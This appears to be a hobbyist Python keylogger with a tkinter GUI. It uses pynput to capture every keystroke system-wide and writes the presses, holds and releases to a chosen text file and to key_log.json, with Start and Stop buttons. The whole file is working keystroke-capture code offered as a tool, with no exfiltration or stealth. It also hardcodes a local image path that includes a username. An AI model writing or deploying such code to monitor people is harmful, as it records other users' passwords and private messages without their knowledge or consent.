import tkinter as tk
from tkinter import filedialog
from tkinter import ttk
from pynput import keyboard
import json

class Keylogger:
    def __init__(self):
        self.keys_used = []
        self.flag = False
        self.listener = None
        self.file_path = 'key_log.txt'  # Default file path

    def generate_text_log(self, keys):
        with open(self.file_path, 'a') as keys_file:
            keys_file.write(keys)

    def generate_json_file(self):
        with open('key_log.json', 'w') as key_log:
            json.dump(self.keys_used, key_log)

    def on_press(self, key):
        if not self.flag:
            self.keys_used.append({'Pressed': f'{key}'})
            self.flag = True
        else:
            self.keys_used.append({'Held': f'{key}'})
        self.generate_json_file()

    def on_release(self, key):
        self.keys_used.append({'Released': f'{key}'})
        if self.flag:
            self.flag = False
        self.generate_json_file()

        keys = str(key)
        self.generate_text_log(keys)

    def start_keylogger(self):
        self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        self.listener.start()
        self.status_label.config(text="[+] Keylogger is running!\n[!] Saving the keys in '{}'".format(self.file_path), foreground='green')
        self.start_button.state(['disabled'])
        self.stop_button.state(['!disabled'])

    def stop_keylogger(self):
        if self.listener:
            self.listener.stop()
        self.status_label.config(text="Keylogger stopped.", foreground='red')
        self.start_button.state(['!disabled'])
        self.stop_button.state(['disabled'])

    def select_file_path(self):
        self.file_path = filedialog.asksaveasfilename(defaultextension=".txt",
                                                       filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if self.file_path:  # If a file path is selected
            self.status_label.config(text="[!] Selected file path: '{}'".format(self.file_path), foreground='blue')
            self.selected_path_label.config(text="Selected file path: '{}'".format(self.file_path), foreground='blue')

    def create_gui(self):
        root = tk.Tk()
        root.title("Keylogger")
        root.configure(background='#f0f0f0')  # Set background color

        style = ttk.Style()
        style.configure('Start.TButton', background='gray', foreground='white')
        style.configure('Stop.TButton', background='red', foreground='white')

        main_frame = ttk.Frame(root, padding="10")
        main_frame.grid(row=0, column=0, sticky="nsew")

        label_frame = ttk.LabelFrame(main_frame, text="Status", padding="10")
        label_frame.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")

        self.status_label = ttk.Label(label_frame, text='**welcome**  select path to continue     press start to keylog .', wraplength=200)
        self.status_label.grid(row=0, column=0, padx=5, pady=5, sticky="nsew")

        self.selected_path_label = ttk.Label(label_frame, text='', wraplength=200)
        self.selected_path_label.grid(row=1, column=0, padx=5, pady=5, sticky="nsew")

        img_path = "C:/Users/jjosh/Downloads/wallpaper/tyh.png"
        img = tk.PhotoImage(file=img_path)
        img_label = ttk.Label(main_frame, image=img)
        img_label.grid(row=0, column=1, padx=10, pady=10, sticky="nsew")

        button_frame = ttk.Frame(main_frame)
        button_frame.grid(row=1, column=0, columnspan=2, padx=10, pady=10, sticky="nsew")

        self.select_path_button = ttk.Button(button_frame, text="Select Path", command=self.select_file_path, style='SelectPath.TButton')
        self.select_path_button.grid(row=0, column=0, padx=5, pady=5)

        self.start_button = ttk.Button(button_frame, text="Start", command=self.start_keylogger, style='Start.TButton')
        self.start_button.grid(row=0, column=1, padx=5, pady=5)

        self.stop_button = ttk.Button(button_frame, text="Stop", command=self.stop_keylogger, state='disabled', style='Stop.TButton')
        self.stop_button.grid(row=0, column=2, padx=5, pady=5)

        root.geometry("500x350")
        root.resizable(False, False)
        root.mainloop()

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.create_gui()
